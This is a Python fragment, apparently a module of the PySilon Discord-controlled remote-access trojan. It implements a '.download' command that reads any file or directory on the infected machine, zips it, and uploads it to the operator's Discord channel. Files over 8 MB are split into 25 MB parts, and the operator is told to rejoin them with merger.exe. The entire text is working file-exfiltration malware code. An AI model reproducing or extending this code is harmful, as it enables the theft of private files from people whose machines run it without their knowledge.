from filesplit.split import Split
from shutil import copy2, rmtree
from zipfile import ZipFile
import os
# end of imports

# on reaction add
elif str(reaction) == '✅':
    if len(messages_from_sending_big_file) > 1:
        for i in messages_from_sending_big_file:
            await i.delete()
        messages_from_sending_big_file = []

# on message
elif message.content[:9] == '.download':
    await message.delete()
    if message.channel.id == channel_ids['file']:
        if message.content == '.download':
            reaction_msg = await message.channel.send('```Syntax: .download <file-or-directory>```'); await reaction_msg.add_reaction('🔴')
        else:
            if os.path.exists('/'.join(working_directory) + '/' + message.content[10:]):
                target_file = '/'.join(working_directory) + '/' + message.content[10:]
                if os.path.isdir(target_file):
                    target_file += '.zip'
                    with ZipFile(target_file,'w') as zip:
                        for file in get_all_file_paths('.'.join(target_file.split('.')[:-1])):
                            zip.write(file)

                if os.stat(target_file).st_size <= 8388608:
                    await message.channel.send(file=discord.File(target_file))
                else:
                    try: os.mkdir('temp')
                    except: rmtree('temp'); os.mkdir('temp')
                    Split(target_file, 'temp').bysize(1024*1024*25)
                    splitted_files_to_send = os.listdir('temp')
                    for sfile in splitted_files_to_send:
                        if sfile != 'manifest':
                            os.rename('temp/' + sfile, 'temp/' + sfile + '.pysilon')
                    splitted_files_to_send = os.listdir('temp')

                    messages_from_sending_big_file = []
                    for i in splitted_files_to_send:
                        messages_from_sending_big_file.append(await message.channel.send(file=discord.File('temp/' + i)))
                    rmtree('temp')
                    reaction_msg = await message.channel.send('```Download all above files, run merger.exe and then react to this message```')
                    messages_from_sending_big_file.append(reaction_msg)
                    await reaction_msg.add_reaction('✅')
            else:
                reaction_msg = await message.channel.send('```❗ File or directory not found.```'); await reaction_msg.add_reaction('🔴')
    else:
        reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
